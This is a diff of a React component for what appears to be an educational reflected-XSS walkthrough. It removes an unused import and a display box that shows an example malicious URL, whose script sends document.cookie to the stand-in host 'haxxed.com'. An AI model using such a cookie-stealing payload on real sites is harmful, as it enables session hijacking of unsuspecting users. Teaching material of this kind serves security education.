@@ -14,7 +14,6 @@ import MessageBoxSeven from './messageboxes/MessageBoxSeven';
 import MessageBoxEight from './messageboxes/MessageBoxEight';
 import MessageBoxNine from './messageboxes/MessageBoxNine';
 import MessageBoxTen from './messageboxes/MessageBoxTen';
-// import { notificationMessage } from './notification'; // Import the notification message
 
 const ReflectedXss: React.FC = () => {
   const [currentIndex, setCurrentIndex] = useState(0);
@@ -114,13 +113,6 @@ const ReflectedXss: React.FC = () => {
 
       <Box sx={{ display: 'flex', justifyContent: 'center' }}>
         <Box sx={{ display: 'flex', flexDirection: 'column', gap: 2 }}>
-          {currentIndex === 5 && (
-            <Paper sx={{ p: 2, mb: 2, backgroundColor: 'blue',width: '40%'}}>
-              <Typography variant="body1" color="white">
-                www.welp.com?<br/>search=&lt;script&gt;window.location='www.haxxed.com?<br/>cookie='+document.cookie&lt;/script&gt;
-              </Typography>
-            </Paper>
-          )}
           {renderMessageBox()}
         </Box>
       </Box>
